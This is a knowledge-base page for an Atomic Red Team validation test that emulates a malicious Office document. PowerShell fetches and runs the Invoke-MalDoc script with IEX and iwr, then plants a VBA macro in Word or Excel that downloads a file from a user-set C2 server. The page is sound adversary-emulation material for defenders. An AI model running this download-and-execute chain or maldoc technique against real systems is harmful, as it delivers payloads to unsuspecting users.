---
atomic_guid: "5202ee05-c420-4148-bf5e-fd7f7d24850c"
title: "Office Generic Payload Download"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.002"
attack_technique_name: "User Execution: Malicious File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "5202ee05-c420-4148-bf5e-fd7f7d24850c"
  - "Office Generic Payload Download"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Office Generic Payload Download

This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
Required input agruments are c2_domain and file_name
Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
Example for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder
Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt

## Metadata

- Atomic GUID: 5202ee05-c420-4148-bf5e-fd7f7d24850c
- Technique: T1204.002: User Execution: Malicious File
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1204.002/T1204.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution|T1204.002]]

## Input Arguments

### c2_domain

- description: This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.

- type: url

### c2_parent_directory

- description: Parent directory where you have the "malicious" file on c2_domain server.
Will default to root directory. Forward slashes are not needed at begining or ending of directory path

- type: path

### file_name

- description: "Malicious" file to be downloaded.
This required file needs to be place on the user provided c2 domain
Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt

- type: string
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt

### macro_path

- description: Location of file which will be converted to a VBA macro

- type: path
- default: PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt

### ms_product

- description: Maldoc application Word or Excel

- type: string
- default: Word

## Dependencies

Destination c2_domain name or IP address must be set to a running HTTP server.

### Prerequisite Check

```powershell
if (#{c2_domain}) (exit 0) else (exit 1)
```

### Get Prerequisite

```powershell
Write-Host "Destination c2 server domain name or IP address must be set and reachable for HTTP service"
```

Microsoftt #{ms_product} must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macroCode = Get-Content "#{macro_path}" -Raw
$URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}"
$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
```

### Cleanup

```powershell
Remove-Item "C:\Users\$env:username\Desktop\#{file_name}" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml)
